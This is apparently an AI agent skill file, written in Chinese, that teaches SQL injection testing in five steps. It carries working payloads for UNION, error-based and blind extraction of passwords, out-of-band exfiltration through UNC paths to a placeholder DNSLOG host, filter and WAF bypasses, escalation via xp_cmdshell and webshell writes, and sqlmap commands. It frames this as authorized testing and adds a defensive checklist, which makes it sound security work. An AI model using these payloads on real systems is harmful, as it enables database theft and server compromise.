---
source: test008008008008-glitch/web-security-skills
skill: 01-sql-injection
fused: 2026-09-17
method: 五步猎洞法
---

---
name: sql-injection
description: SQL 注入实战手册。当用户输入进入 SQL 查询（登录、搜索、排序、筛选、报表等），或需要验证/利用注入点、绕过过滤时使用。
---

# 第一技 · SQL 注入 —— 让数据库自己开口说话

> 猎手视角：注入的本质，是开发者把"数据"当"代码"送进了数据库，而你要做的，是找到那条没有被划清的边界。

**目标读者**：具备基础 Web 测试经验的安全工程师
**前置要求**：理解 HTTP 请求结构、SQL 基本 SELECT 语法、Burp Suite 基本操作

---

## 何时启用本技

- 登录、注册、找回密码等**认证流程**
- 商品搜索、列表筛选、**排序参数**（`?order=price`、`?sort=desc`）
- 报表导出、分页参数（`?page=3`）
- 任何拼接进 SQL 的 Header：`X-Forwarded-For`、`Referer`、`User-Agent`、Cookie
- JSON 请求体里的字段值、XML 报文中的取值节点

> 经验之谈：最容易被忽略的注入点，往往在"看起来不像参数"的地方——排序字段、导出文件名、Cookie 里的会话标识。

---

## 一、原理拆解

一句拼接 SQL 的诞生：

```
query = "SELECT * FROM goods WHERE name = '" + keyword + "'"
输入:  ' UNION SELECT password FROM users--
执行:  SELECT * FROM goods WHERE name = '' UNION SELECT password FROM users--'
```

三个关键认知：

1. **闭合优先**：先确定自己站在什么"引号语境"里（字符串/数字/括号），闭合它，才有后续
2. **注释收尾**：`--`、`#`、`/*` 用来吃掉开发者写在后面的部分，消除语法报错
3. **语境决定武器**：数字型语境不需要引号；ORDER BY 后面接不了 UNION，但可以接条件表达式

---

## 二、五步猎洞法

### 第一步：识面 —— 摸清参数全景

把目标页面的**所有**输入面列出来：URL 参数、POST 表单、JSON 字段、Header、Cookie。逐一登记，编号管理。不要只测肉眼看得到的输入框。

### 第二步：定点 —— 投放探针

从小探针开始，按响应表现分类：

| 探针 | 响应表现 | 初步判断 |
|------|----------|----------|
| `'` | 500 / SQL 报错 | 字符串语境，注入嫌疑大 |
| `1-1` vs `0` vs `2-1` | 结果一致 | 数字语境做算术 = 被执行 |
| `1' order by 10--` | 报错 vs 成功边界 | UNION 可行，列数已知 |
| `' AND SLEEP(5)--` | 延迟 5 秒 | 时间盲注确认 |
| `1' and '1'='2` vs `'1'='1` | 内容差异 | 布尔盲注可行 |

**响应三通道**：报错文本（最直接）、内容差异（布尔）、时间差（盲）。没有回显不代表没有注入。

### 第三步：验证 —— 指纹与列数

确认注入后先做数据库指纹，后文武器全部依赖它：

| 指纹线索 | 数据库 | 下一步武器 |
|----------|--------|-----------|
| `You have an error in your SQL syntax` | MySQL | `SLEEP()`、`@@version` |
| `OLE DB Provider` / `sqlserver` 报错 | MSSQL | `WAITFOR DELAY`、`xp_cmdshell` |
| `PG::` / `relation does not exist` | PostgreSQL | `pg_sleep()`、`||` 拼接 |
| `ORA-` 开头 | Oracle | `utl_inaddr` 外带 |
| `SQLITE_ERROR` | SQLite | 布尔/UNION 为主，无 sleep |

列数探测：`ORDER BY 1--`、`ORDER BY 2--`……报错临界即列数；或 `UNION SELECT NULL,NULL,...` 逐个填。

### 第四步：利用 —— 按回显类型取数

**有回显（UNION 型）**

```sql
' UNION SELECT username, password, NULL FROM users--
' UNION SELECT table_name, NULL, NULL FROM information_schema.tables--
```

**半盲（报错型）**

```sql
' AND extractvalue(1, concat(0x7e, database()))--        -- MySQL
' AND 1=(SELECT ... FROM ... WHERE ... )::text --         -- PG 类型报错
```

**全盲（布尔/时间）**

```sql
' AND (SELECT substr(password,1,1) FROM users WHERE id=1)='a'--
' AND IF(substr(database(),1,1)='d', SLEEP(3), 0)--
```

全盲取数建议直接上工具（sqlmap `--technique=B/T`），手工逐字符效率过低。

**带外（OOB）**——目标完全无回显时最后的通道：

```sql
-- MySQL (Windows) + UNC 路径，借助 SMB 把数据带出
SELECT load_file(concat('\\\\<你的DNSLOG>\\', database()));
-- MSSQL
EXEC master..xp_dirtree '\\<你的DNSLOG>\test';
```

### 第五步：收官 —— 升级与留证

- **文件读写**：MySQL `LOAD_FILE()` / `INTO OUTFILE`（受 `secure_file_priv` 限制）；写 WebShell 需已知物理路径
- **OS 层**：MSSQL `xp_cmdshell`；MySQL `UDF` 提权；PG `COPY PROGRAM`（需超级用户）
- **留证**：截图 + 完整请求/响应原文 + `sqlmap` 日志，报告只写"证明存在"所需的最小数据量（如当前库名），不要拖全库

---

## 三、实战推演（虚构场景）

> 场景：授权测试某虚构电商 `shop.demo-example.com`，商品搜索页 `GET /search?kw=背包&order=price`

1. **识面**：参数 `kw`（字符串）、`order`（排序字段）
2. **定点**：`kw=背包'` → 页面报 `MySQL syntax error` ——字符串语境；`order=price'` 无报错，改 `order=price,if(1=1,1,(select 1 union select 2))` 页面正常，`1=2` 时报错 ——排序位可注入
3. **验证**：报错含 `MySQL`，指纹 MySQL；`kw` 位 `ORDER BY 10--` 探出列数 = 6
4. **利用**：`kw=' UNION SELECT 1,user(),version(),database(),5,6 FROM dual--` 回显确认当前库 `shopdb`
5. **收官**：仅取证 `database()` 与一个测试账号存在性即停，写入报告；`order` 参数修复建议随附

---

## 四、对抗与绕过

| 过滤手段 | 破解思路 |
|----------|----------|
| 过滤空格 | `/**/`内联注释、`%09`（Tab）、括号包裹法 `(SELECT(password)FROM(users))` |
| 过滤引号 | 十六进制 `0x616263`、`CHAR()` 拼接 |
| 关键字黑名单 | 大小写混写、`selselectect` 双写、等价函数替换（`sleep`→`benchmark`） |
| 参数化但 ORDER BY 没参数化 | 排序字段走白名单校验（这是开发侧最常见的漏网之鱼，测试侧要专门盯） |
| WAF 拦截 `union select` | HPP 参数污染、分块传输编码、超长垃圾参数填充 |

---

## 五、防御视角（给蓝队/开发的修复清单）

1. **参数化查询是唯一正解**：预编译 + 占位符，ORM 也要检查 `raw()`、`text()` 的逃逸用法
2. **排序/表名等标识符无法参数化** → 服务端白名单映射
3. 最小权限：Web 账号禁 FILE、禁跨库、禁系统过程
4. 统一错误页：报错细节只进日志，不出响应
5. 加一层 WAF 语义检测作为纵深（但要明确它不是修复）

---

## 六、踩坑记录

- **宽字节注入**：GBK 环境下 `%df'` 吞掉转义反斜杠，`addslashes` 在 GBK 是无效防御
- **二次注入**：数据入库时被转义"安全"，取出拼接时还原成注入。搜索框测完，记得跟一下"个人资料回显"这类下游页面
- **数字型语境加引号**是新手最常见的假阴性——`1'` 报错但 `1 or 1=1` 才是正确探针
- sqlmap 跑不出来 ≠ 没有注入：`--tamper` 没配对、cookie 注入没加 `--cookie`、二次注入需要 `--second-url`
- `ORDER BY` 位注入 UNION 不生效，但布尔/报错/时间盲照常可用，别一条路走到黑

---

## 七、速查卡

```text
指纹:   MySQL→SLEEP | MSSQL→WAITFOR DELAY | PG→pg_sleep | Oracle→utl_http
列数:   ORDER BY n-- 递增至报错
回显:   UNION SELECT NULL,... 逐列补类型
报错:   extractvalue / updatexml (MySQL) | ST_GEOMFROMTEXT 'aaaa'(PG 旧版)
盲注:   AND (条件) 布尔 | IF(cond,SLEEP(3),0) 时间
外带:   load_file+UNC | xp_dirtree | utl_inaddr.get_host_address
工具:   sqlmap -u URL -p PARAM --dbms=mysql --batch --level=3 --risk=2
```
